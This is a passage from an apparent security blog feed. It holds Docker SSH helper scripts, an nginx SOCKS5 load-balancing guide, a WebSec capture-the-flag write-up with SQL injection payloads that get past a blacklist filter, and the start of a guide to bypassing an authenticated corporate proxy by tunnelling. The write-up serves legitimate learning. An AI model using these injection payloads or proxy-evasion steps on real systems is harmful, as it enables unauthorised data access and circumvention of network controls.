$docker_image)</span><br><span class="line">#echo &quot;$uuid&quot;</span><br><span class="line">ips+&#x3D;($(docker inspect -f &#39;&#123;&#123;range.NetworkSettings.Networks&#125;&#125;&#123;&#123;.IPAddress&#125;&#125;&#123;&#123;end&#125;&#125;&#39; $uuid))</span><br><span class="line">echo -ne &quot;.&quot;</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo &quot;&quot;</span><br><span class="line"></span><br><span class="line">for ip in &quot;$&#123;ips[@]&#125;&quot;; do</span><br><span class="line">echo &quot;ssh $ip&quot;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><p>The script start x ssh local server \o/</p><p>stopDocker_ssh.sh  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">name&#x3D;&#39;ssh_&#39;</span><br><span class="line"></span><br><span class="line">function usage()&#123;</span><br><span class="line"></span><br><span class="line">echo &quot;-n [name] filter prefix to delete, default value: $name&quot;</span><br><span class="line">echo &quot;-h show help&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while getopts &quot;:n:h&quot; options; do</span><br><span class="line"></span><br><span class="line">case &quot;$&#123;options&#125;&quot; in</span><br><span class="line">h)</span><br><span class="line">usage</span><br><span class="line">exit</span><br><span class="line">;;</span><br><span class="line">n)</span><br><span class="line">name&#x3D;$&#123;OPTARG&#125;</span><br><span class="line">;;</span><br><span class="line">:)</span><br><span class="line">echo &quot;Error: -$&#123;OPTARG&#125; requires an argument.&quot;</span><br><span class="line">usage</span><br><span class="line">exit 4</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">echo &quot;Error: fail option...&quot;</span><br><span class="line">usage</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># docker stop all containers</span><br><span class="line">docker stop $(docker ps -a -q -f name&#x3D;$name) &gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line"># Docker rm all</span><br><span class="line">docker rm $(docker ps -a -q -f name&#x3D;$name) &gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p>This script stop and remove all docker how match “ssh_”</p><p><img src="/2021/03/10/Docker-SSH-on-the-fly/dockerSSH.gif" alt="docker ssh gif"></p><p>Now you can put this Bash script into your PATH ;)  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/03/10/Docker-SSH-on-the-fly/docker-ssh-header.png&quot; alt=&quot;Docker SSH on the fly&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;purpose&quot;&gt;&lt;a href=&quot;#purpose&quot; c</summary>
      
    
    
    
    
    <category term="docker" scheme="https://0x25.github.io/tags/docker/"/>
    
    <category term="ssh" scheme="https://0x25.github.io/tags/ssh/"/>
    
  </entry>
  
  <entry>
    <title>Load Balance Socks5 with Nginx</title>
    <link href="https://0x25.github.io/2021/02/14/Load-Balance-Socks5-with-Nginx/"/>
    <id>https://0x25.github.io/2021/02/14/Load-Balance-Socks5-with-Nginx/</id>
    <published>2021-02-14T10:29:14.000Z</published>
    <updated>2021-02-14T16:08:48.917Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/02/14/Load-Balance-Socks5-with-Nginx/LB-header.png" alt="LoadBalance socks5 with nginx"></p><h1 id="purpose"><a href="#purpose" class="headerlink" title="purpose"></a>purpose</h1><p>Using nginx to load balance traffic through multiple socks5 proxies.</p><p><img src="/2021/02/14/Load-Balance-Socks5-with-Nginx/LB-diagram.png" alt="LB nginx socks5"></p><h1 id="prerequisite"><a href="#prerequisite" class="headerlink" title="prerequisite"></a>prerequisite</h1><p><a href="http://nginx.org/">Nginx</a> with the ngx_stream_core_module module .It is available since version 1.9.0.<br>You can use </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -V</span><br></pre></td></tr></table></figure><p>to check if you have the correct version. Look at <a href="https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/#prebuilt_debian">https://docs.nginx.com/nginx/admin-guide/installing-nginx/installing-nginx-open-source/#prebuilt_debian</a> if you need to install the correct version.</p><p>You can check <a href="https://0x25.github.io/2020/11/27/Configure-proxy-Socks-in-Burp/">here</a> for socks5.</p><h1 id="configuration"><a href="#configuration" class="headerlink" title="configuration"></a>configuration</h1><p>By default nginx.conf is configured for http module.<br>So we need to change the configuration.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/nginx/stream.d</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Edit Nginx configuration</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">cat nginx.conf                                                                 </span><br><span class="line"></span><br><span class="line">user  nginx;</span><br><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">error_log  /var/<span class="built_in">log</span>/nginx/error.log warn;</span><br><span class="line">pid        /var/run/nginx.pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       /etc/nginx/mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    log_format  main  <span class="string">&#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span></span><br><span class="line">                      <span class="string">&#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span></span><br><span class="line">                      <span class="string">&#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    access_log  /var/<span class="built_in">log</span>/nginx/access.log  main;</span><br><span class="line"></span><br><span class="line">    sendfile        on;</span><br><span class="line">    <span class="comment">#tcp_nopush     on;</span></span><br><span class="line"></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gzip  on;</span></span><br><span class="line"></span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># add stream config</span></span><br><span class="line">stream &#123;</span><br><span class="line"></span><br><span class="line">    log_format basic <span class="string">&#x27;$remote_addr:$remote_port $upstream_addr [$time_local] &#x27;</span></span><br><span class="line">                 <span class="string">&#x27;$protocol $status $bytes_sent $bytes_received &#x27;</span></span><br><span class="line">                 <span class="string">&#x27;$session_time&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    access_log /var/<span class="built_in">log</span>/nginx/stream-access.log basic;</span><br><span class="line"></span><br><span class="line">    include /etc/nginx/stream.d/*.conf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We add the stream{…} with some default configuration in it, like logs and stream.d folder.</p><p>Now edit a file in stream.d name it ‘default.conf’ or ‘whatever.conf’</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">upstream stream_socks5 &#123;</span><br><span class="line">    server 127.0.0.1:1080;</span><br><span class="line">    server 127.0.0.1:1081;</span><br><span class="line">    server 127.0.0.1:1082;</span><br><span class="line">    server 127.0.0.1:1083;</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen 127.0.0.1:3333;</span><br><span class="line">    proxy_pass stream_socks5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>In stream_socks5 add the proxy socks5 you have, one by line. In this configuration I have 4 local ssh proxy socks5.</p><p>Start SSH socks5. I create a small bash script for this  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># config</span></span><br><span class="line">ssh_key_path=<span class="string">&#x27;/home/kali/.ssh/superKey.pkey&#x27;</span></span><br><span class="line">user=<span class="string">&#x27;ssh_user&#x27;</span></span><br><span class="line"></span><br><span class="line">ssh_servers=$(cat &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">ssh.server.com:22</span></span><br><span class="line"><span class="string">ssh2.someServer.com:22</span></span><br><span class="line"><span class="string">x.x.x.x:2222</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">port_inc=1080</span><br><span class="line"></span><br><span class="line"><span class="comment"># code</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> server <span class="keyword">in</span> <span class="variable">$ssh_servers</span>; <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line">    ip=$(<span class="built_in">echo</span> <span class="variable">$server</span> | awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">    port=$(<span class="built_in">echo</span> <span class="variable">$server</span> | awk -F <span class="string">&quot;:&quot;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ssh local socks5</span></span><br><span class="line">    ssh -D <span class="variable">$port_inc</span> -C -N -f -i <span class="variable">$ssh_key_path</span> <span class="variable">$user</span>@<span class="variable">$ip</span> -p <span class="variable">$port</span></span><br><span class="line"></span><br><span class="line">    port_inc=$((<span class="variable">$port_inc</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">pgrep -f <span class="string">&#x27;ssh -D&#x27;</span></span><br><span class="line">netstat -tanlp | grep 127.0.0.1</span><br><span class="line"><span class="comment"># kill</span></span><br><span class="line"><span class="comment"># pkill -f &#x27;ssh -D&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Normally it start all the local port like </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tcp        0      0 127.0.0.1:1082          0.0.0.0:*               LISTEN      7296&#x2F;ssh            </span><br><span class="line">tcp        0      0 127.0.0.1:1080          0.0.0.0:*               LISTEN      7280&#x2F;ssh            </span><br><span class="line">tcp        0      0 127.0.0.1:1081          0.0.0.0:*               LISTEN      7288&#x2F;ssh  </span><br></pre></td></tr></table></figure><p>restart nginx service  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service nginx restart</span><br></pre></td></tr></table></figure><p>run multiple time</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --socks5 127.0.0.1:3333 http:&#x2F;&#x2F;myexternalip.com&#x2F;raw</span><br></pre></td></tr></table></figure><p>Normally the IP address change.</p><p>You can use this proxy socks5 in  </p><ul><li>Browser</li><li>proxychains4</li><li>curl</li><li>…</li></ul><p>By default nginx use round robin to load balance stream.<br>You can look at <a href="https://docs.nginx.com/nginx/admin-guide/load-balancer/tcp-udp-load-balancer/">https://docs.nginx.com/nginx/admin-guide/load-balancer/tcp-udp-load-balancer/</a> if you want to add UDP and change some configuration.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/02/14/Load-Balance-Socks5-with-Nginx/LB-header.png&quot; alt=&quot;LoadBalance socks5 with nginx&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;purpose&quot;&gt;&lt;a href=&quot;#p</summary>
      
    
    
    
    
    <category term="nginx" scheme="https://0x25.github.io/tags/nginx/"/>
    
    <category term="socks5" scheme="https://0x25.github.io/tags/socks5/"/>
    
  </entry>
  
  <entry>
    <title>WebSec Capitain Flag</title>
    <link href="https://0x25.github.io/2021/02/07/WebSec-Capitain-Flag/"/>
    <id>https://0x25.github.io/2021/02/07/WebSec-Capitain-Flag/</id>
    <published>2021-02-07T15:01:48.000Z</published>
    <updated>2021-02-07T17:31:47.793Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/02/07/WebSec-Capitain-Flag/CTF.png" alt="ctf"></p><h1 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h1><p><a href="https://websec.fr/">Websec.fr</a> is a great website to perform PHP code review. There are ~28 challenges with different difficulty levels ;)</p><h1 id="Captain-flag"><a href="#Captain-flag" class="headerlink" title="Captain flag"></a>Captain flag</h1><p><img src="/2021/02/07/WebSec-Capitain-Flag/captain-flag.png" alt="captain flag"></p><p>It is a form. The input is an int.</p><p>The interesting part of the code is in the ‘<strong>sanitize</strong>‘ function</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$table</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">/* Rock-solid: https://secure.php.net/manual/en/function.is-numeric.php */</span></span><br><span class="line">    <span class="keyword">if</span> (! is_numeric (<span class="variable">$id</span>) <span class="keyword">or</span> <span class="variable">$id</span> &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;The id must be numeric, and superior to one.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Rock-solid too! */</span></span><br><span class="line">    <span class="variable">$special1</span> = [<span class="string">&quot;!&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;#&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>];</span><br><span class="line">    <span class="variable">$special2</span> = [<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;@&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;]&quot;</span>];</span><br><span class="line">    <span class="variable">$special3</span> = [<span class="string">&quot;^&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;&#125;&quot;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = [<span class="string">&quot;union&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;as&quot;</span>];</span><br><span class="line">    <span class="variable">$blacklist</span> = array_merge (<span class="variable">$special1</span>, <span class="variable">$special2</span>, <span class="variable">$special3</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos(<span class="variable">$table</span>, <span class="variable">$value</span>) !== <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">exit</span>(<span class="string">&quot;Presence of &#x27;&quot;</span> . <span class="variable">$value</span> . <span class="string">&quot;&#x27; detected: abort, abort, abort!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;user_id&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;table&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">    <span class="variable">$table</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;table&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    sanitize(<span class="variable">$id</span>, <span class="variable">$table</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pdo</span> = <span class="keyword">new</span> SQLite3(<span class="string">&#x27;database.db&#x27;</span>, SQLITE3_OPEN_READONLY);</span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&#x27;SELECT id,username FROM &#x27;</span> . <span class="variable">$table</span> . <span class="string">&#x27; WHERE id = &#x27;</span> . <span class="variable">$id</span>;</span><br><span class="line">    <span class="comment">//$query = &#x27;SELECT id,username,enemy FROM &#x27; . $table . &#x27; WHERE id = &#x27; . $id;</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$getUsers</span> = <span class="variable">$pdo</span>-&gt;query(<span class="variable">$query</span>);</span><br><span class="line">    <span class="variable">$users</span> = <span class="variable">$getUsers</span>-&gt;fetchArray(SQLITE3_ASSOC);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$userDetails</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$users</span>) &#123;</span><br><span class="line">        <span class="variable">$userDetails</span> = <span class="variable">$users</span>;</span><br><span class="line">    <span class="variable">$userDetails</span>[<span class="string">&#x27;table&#x27;</span>] = htmlentities(<span class="variable">$table</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>First it check if <strong>$id</strong> <a href="https://www.php.net/manual/fr/function.is-numeric.php">is_numeric</a> and <strong>$id</strong>&gt;2<br>Second it check if the is no ‘special string’ (blacklist) in table name.</p><p>We can see that the SQL query is concatenate string and that always bad (<a href="https://owasp.org/www-community/attacks/SQL_Injection">SQLi</a>) and it is recommended to use ‘<a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">prepared statement</a>‘.</p><p>In CTF there’s no hazard so column ‘enemy’ is an information. We can imagine we need to find the value enemy in id 1 \o/</p><p>I do some simple test to try to inject the table value but nothing worked :/<br>So I try to bypass the $id with:</p><ul><li>big int</li><li>0e11111 value</li><li>…</li></ul><p>but nothing work :/</p><p>So I return on SQL injection tests, on table name.<br>It is possible to inject some query in table field in HTTP Post submit (<a href="https://portswigger.net/burp/communitydownload">Burp</a> is your friend) with:  </p><details>  <summary>Spoiler warning</summary><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">user_id&#x3D;2&amp;table&#x3D;(select id,username from costume)&amp;submit&#x3D;Submit</span><br><span class="line"></span><br><span class="line"># this one work to </span><br><span class="line">user_id&#x3D;2&amp;table&#x3D;(select id,username from costume where id like 2)&amp;submit&#x3D;Envoyer</span><br><span class="line"></span><br><span class="line"># this work on my sql test but not on websec (blacklist &#39;+&#39; and &#39;as&#39;)</span><br><span class="line">user_id&#x3D;2&amp;table&#x3D;(select id+1 as id,username from costume where id like 1)&amp;submit&#x3D;Envoyer</span><br><span class="line"></span><br></pre></td></tr></table></figure></details><p>But this don’t bypass the filter to access the id=1.</p><p>I try a time base SQLi</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from (select id,username from costume where id like 1 and substr(username,1,1) like CHAR(0X37) and randomblob(100000000) ) </span><br></pre></td></tr></table></figure><p>It work on <a href="https://sqliteonline.com/">sqliteonline</a> but not on websec :/</p><p>After reading multiple post on the web I find <a href="https://www.guru99.com/sqlite-query.html#2">THIS</a>. In Sqlite ‘AS’ is not mandatory in column name alias.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT StudentName &#39;Student Name&#39; FROM Students;</span><br><span class="line"># is the same as</span><br><span class="line">SELECT StudentName &#39;Student Name&#39; FROM Students;</span><br></pre></td></tr></table></figure><p>So we can try to bypass the id column with this information and what we find before.</p><p>You can use the code SQL to <a href="https://sqliteonline.com/">generate</a> your own Table and do some test</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE costume (id integer primary key, username varchar(20), enemy varchar(20) );</span><br><span class="line"></span><br><span class="line">insert into costume (username,enemy) VALUES (&quot;Cap&#39;tain flag&quot;,&#39;&#123;FLAG&#125;&#39;);</span><br><span class="line">insert into costume (username,enemy) VALUES (&#39;Spiderman&#39;,&#39;Green Goblin&#39;);</span><br><span class="line">insert into costume (username,enemy) VALUES (&#39;Batman&#39;,&#39;The Joker&#39;);</span><br><span class="line">insert into costume (username,enemy) VALUES (&#39;Superman&#39;,&#39;Lex Luthor&#39;);</span><br></pre></td></tr></table></figure><details>  <summary>Spoiler warning</summary><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user_id&#x3D;222&amp;table&#x3D;(select 222 id,username from costume)&amp;submit&#x3D;Envoyer</span><br><span class="line"># output Batman ??? don&#39;t understand why ... Captain is the value </span><br><span class="line">expected !? Oo</span><br><span class="line"></span><br><span class="line">user_id&#x3D;222&amp;table&#x3D;(select 222 id,enemy username from costume)&amp;submit&#x3D;Envoyer</span><br><span class="line"># output the flag</span><br><span class="line"></span><br><span class="line"># more elegant</span><br><span class="line">user_id&#x3D;222&amp;table&#x3D;(select 222 id,enemy username from costume where id like 1)&amp;submit&#x3D;Envoyer</span><br></pre></td></tr></table></figure></details>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/02/07/WebSec-Capitain-Flag/CTF.png&quot; alt=&quot;ctf&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    
    <category term="ctf" scheme="https://0x25.github.io/tags/ctf/"/>
    
    <category term="websec" scheme="https://0x25.github.io/tags/websec/"/>
    
    <category term="sqlite" scheme="https://0x25.github.io/tags/sqlite/"/>
    
  </entry>
  
  <entry>
    <title>HTTPS Tunneling</title>
    <link href="https://0x25.github.io/2021/01/18/HTTPS-Tunneling/"/>
    <id>https://0x25.github.io/2021/01/18/HTTPS-Tunneling/</id>
    <published>2021-01-18T18:02:07.000Z</published>
    <updated>2021-01-26T15:51:15.886Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/01/18/HTTPS-Tunneling/network-header.png" alt="header"></p><h1 id="Purpose"><a href="#Purpose" class="headerlink" title="Purpose"></a>Purpose</h1><p>Bypass authenticated proxy by using HTTPS/TLS tunnel.</p><p><img src="/2021/01/18/HTTPS-Tunneling/architecture.png" alt="architecture"></p><!-- https://app.cloudcraft.co/ --><h1 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h1><p>We need a server on Internet. A simple <a href="https://en.wikipedia.org/wiki/Virtual_private_server">VPS</a> is enough.<br>Or maybe your own Internet access with the right configuration (port redirection …). Client need to be behind a proxy with NTLM authentication.<br>To create the tunnel we need this tools <a href="https://securesocketfunneling.github.io/ssf/#home">SSF</a> and <a href="https://doc.ubuntu-fr.org/cntlm">cntlm</a>.<br>Install :</p><ul><li>SSF on both side (client and server) (linux/windows…)</li><li>cntlm on client side (linux)</li></ul><h1 id="Install-amp-config"><a href="#Install-amp-config" class="headerlink" title="Install &amp; config"></a>Install &amp; config</h1><p>Install</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install cntlm </span><br><span class="line"><span class="comment">#sudo apt install openssl libssl1.0.0 libssl-dev  </span></span><br><span class="line">wget https://github.com/securesocketfunneling/ssf/releases/download/3.0.0/ssf-linux-x86_64-3.0.0.zip -O ssf.zip</span><br><span class="line">unzip ssf.zip</span><br></pre></td></tr></table></figure><h2 id="Configure-cntlm-client"><a href="#Configure-cntlm-client" class="headerlink" title="Configure cntlm (client)"></a>Configure cntlm (client)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># generate ntlm hash to configure /etc/cntlm.conf</span></span><br><span class="line">cntlm -H -d &lt;domaine_AD&gt; -u &lt;user&gt;</span><br></pre></td></tr></table></figure><p>Example:  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cntlm -H -d customerDomain.in -u user  </span><br><span class="line">Password:  </span><br><span class="line">PassLM          FE03A594184396D6552C4BCA4AEBFB11  </span><br><span class="line">PassNT          F3496B77FA086840D57D7F868C476AC8  </span><br><span class="line">PassNTLMv2      6614D6CFED66810F39A6FB6518F7AD56    <span class="comment"># Only for user &#x27;user&#x27;, domain &#x27;customerDomain.in&#x27;  </span></span><br></pre></td></tr></table></figure><p>Edit /etc/cntlm.conf, paste the code (at the right place) and set the IP:port of the proxy.</p><p>Start proxy  </p><figure class="highlight 